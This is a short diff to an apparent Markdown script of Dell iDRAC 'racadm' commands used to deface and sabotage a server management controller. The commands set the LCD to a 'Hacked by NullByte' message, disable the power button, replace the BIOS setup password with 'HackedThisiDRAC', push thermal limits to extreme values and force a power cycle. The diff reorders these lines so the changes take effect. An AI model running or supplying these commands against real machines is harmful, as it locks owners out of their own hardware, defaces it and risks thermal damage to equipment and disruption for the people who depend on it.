@@ -16,11 +16,11 @@ racadm set BIOS.SysProfileSettings.MonitorMwait Disabled
 racadm set System.ThermalSettings.FanSpeedOffset 1
 racadm set cfgThermalEnhancedCoolingMode 1
 racadm set System.ThermalSettings.AirTemperatureRiseLimit 255
-racadm jobqueue create BIOS.Setup.1-1 -r pwrcycle -s TIME_NOW
 racadm set BIOS.SysSecurity.PwrButton Disabled
-racadm set BIOS.SysSecurity.SetupPassword YourSecurePassword 
+racadm set BIOS.SysSecurity.SetupPassword HackedThisiDRAC 
 racadm set System.LCD.Configuration 0
 racadm set System.LCD.UserDefinedString "Hacked by NullByte :3     Contact: me@nullbyte.rip" 
+racadm jobqueue create BIOS.Setup.1-1 -r pwrcycle -s TIME_NOW
 ```
 
 ## Update
